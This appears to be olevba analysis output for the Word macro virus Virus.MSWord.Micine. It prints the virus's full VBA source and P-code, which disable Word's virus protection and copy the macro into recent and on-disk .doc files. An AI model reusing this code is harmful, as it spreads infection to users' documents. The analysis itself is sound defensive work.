olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Micine
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Micine - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VAC.bas 
in file: Virus.MSWord.Micine - OLE stream: 'Macros/VBA/VAC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'ZAVSoft200278IIFHNI@#/...mini antimacro vakcine 99
On Error Resume Next
Set myRange = ActiveDocument.Paragraphs(1).Range
myRange.Font.Hidden = False
Options.VirusProtection = False
Application.DisplayRecentFiles = True
RecentFiles.Maximum = 9
 Dim MyDate$: Dim macnam: MyDate$ = Date
 Dim zzz: Dim doc$: Dim zz: Dim mypath(2)
 ReDim mydocs(0): Dim num: Dim size: Dim virdoc
Set cntnr = MacroContainer
    doc$ = cntnr.FullName
com = MyDate$ Like "19*"
If com = True Then GoTo dest
begin:
zz = RecentFiles.Count
For z = 1 To zz
zzz = RecentFiles(z)
Application.OrganizerDelete Source:=zzz, _
         Name:="Module", _
        Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=doc$, _
        Destination:=zzz, Name:="VAC", _
        Object:=wdOrganizerObjectProjectItems
        Next z
GoTo ex
dest:
mypath(1) = CurDir("C"): mypath(2) = CurDir("D")
Randomize
n = Int((2 * Rnd) + 1)
Set fs = Application.FileSearch
With fs
    .LookIn = mypath(n)
    .SearchSubFolders = True
    .FileName = "*.doc"
    If .Execute > 0 Then
        size = .FoundFiles.Count
        ReDim mydocs(size)
        For I = 1 To size - 1
        mydocs(I) = .FoundFiles(I)
        Next I
        For I = 1 To size
   
    Application.OrganizerDelete Source:=mydocs(x), _
         Name:="module", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=doc$, _
        Destination:=mydocs(I), Name:="VAC", _
        Object:=wdOrganizerObjectProjectItems
        Next I
    Else
        GoTo begin
    End If
    End With
ex:
End Sub
Sub autoexit()
Options.VirusProtection = False
AutoOpen
End Sub

Sub autoclose()
Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Micine
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1288 bytes
' Macros/VBA/VAC - 6235 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0032 "ZAVSoft200278IIFHNI@#/...mini antimacro vakcine 99"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	Set myRange 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld myRange 
' 	MemLd Font 
' 	MemSt Hidden 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #7:
' 	LitDI2 0x0009 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #8:
' 	Dim 
' 	VarDefn MyDate
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn macnam
' 	BoS 0x0000 
' 	Ld Date 
' 	St MyDate$ 
' Line #9:
' 	Dim 
' 	VarDefn zzz
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn doc
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn zz
' 	BoS 0x0000 
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn mypath
' Line #10:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim mydocs 0x0001 (As Variant)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn num
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn size
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn virdoc
' Line #11:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set cntnr 
' Line #12:
' 	Ld cntnr 
' 	MemLd FullName 
' 	St doc$ 
' Line #13:
' 	Ld MyDate$ 
' 	LitStr 0x0003 "19*"
' 	Like 
' 	St com 
' Line #14:
' 	Ld com 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo dest 
' 	EndIf 
' Line #15:
' 	Label begin 
' Line #16:
' 	Ld RecentFiles 
' 	MemLd Count 
' 	St zz 
' Line #17:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld zz 
' 	For 
' Line #18:
' 	Ld z 
' 	ArgsLd RecentFiles 0x0001 
' 	St zzz 
' Line #19:
' 	LineCont 0x0008 07 00 09 00 0B 00 08 00
' 	Ld zzz 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Module"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #20:
' 	LineCont 0x0008 07 00 08 00 0F 00 08 00
' 	Ld doc$ 
' 	ParamNamed Source 
' 	Ld zzz 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "VAC"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #21:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	GoTo ex 
' Line #23:
' 	Label dest 
' Line #24:
' 	LitStr 0x0001 "C"
' 	ArgsLd CurDir 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt mypath 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0001 "D"
' 	ArgsLd CurDir 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt mypath 0x0001 
' Line #25:
' 	ArgsCall Read 0x0000 
' Line #26:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St n 
' Line #27:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #28:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #29:
' 	Ld n 
' 	ArgsLd mypath 0x0001 
' 	MemStWith LookIn 
' Line #30:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #31:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #32:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #33:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	St size 
' Line #34:
' 	OptionBase 
' 	Ld size 
' 	Redim mydocs 0x0001 (As Variant)
' Line #35:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld size 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #36:
' 	Ld I 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ld I 
' 	ArgsSt mydocs 0x0001 
' Line #37:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld size 
' 	For 
' Line #39:
' Line #40:
' 	LineCont 0x0008 0A 00 09 00 0E 00 08 00
' 	Ld x 
' 	ArgsLd mydocs 0x0001 
' 	ParamNamed Source 
' 	LitStr 0x0006 "module"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #41:
' 	LineCont 0x0008 07 00 08 00 12 00 08 00
' 	Ld doc$ 
' 	ParamNamed Source 
' 	Ld I 
' 	ArgsLd mydocs 0x0001 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "VAC"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	GoTo begin 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	Label ex 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub autoexit())
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #51:
' 	ArgsCall AutoOpen 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Sub autoclose())
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed NoPrompt 
' 	Ld wdOriginalDocumentFormat 
' 	ParamNamed OriginalFormat 
' 	Ld Documents 
' 	ArgsMemCall Save 0x0002 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

